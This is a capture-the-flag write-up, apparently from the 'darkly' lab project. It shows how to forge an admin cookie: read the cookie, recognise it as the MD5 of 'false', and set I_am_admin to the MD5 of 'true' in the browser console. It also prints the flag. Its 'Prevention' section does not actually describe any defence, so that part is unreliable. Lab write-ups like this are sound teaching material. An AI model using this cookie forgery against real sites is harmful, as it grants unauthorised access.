# SESSION HIJACKING ATTACK

## Flag
```
df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3
```

## Discovery
On the page http://{IP_ADDRESS}/

```
# inspector console
document.cookie
> 68934a3e9455fa72420237eb05902327
```

```
md5_decrypt('68934a3e9455fa72420237eb05902327')
> false
md5_encrypt('true')
> b326b5062b2f0e69046810717534cb09
```

```
# inspector console
document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09"
```
Refresh page

## Use
> perform any actions that the original user is authorized to do during the active session

## Prevention
> Session cookies are a way of overcoming these constraints and allowing web applications to identify individual computer systems and store the current session state

## Documentation
- [owasp - Session hijacking attack](https://www.owasp.org/index.php/Session_hijacking_attack)
- [netsparker - Session hijacking](https://www.netsparker.com/blog/web-security/session-hijacking/)
- [md5](https://md5decrypt.net/en/)

---

[RETURN](https://github.com/tillderoquefeuil/darkly)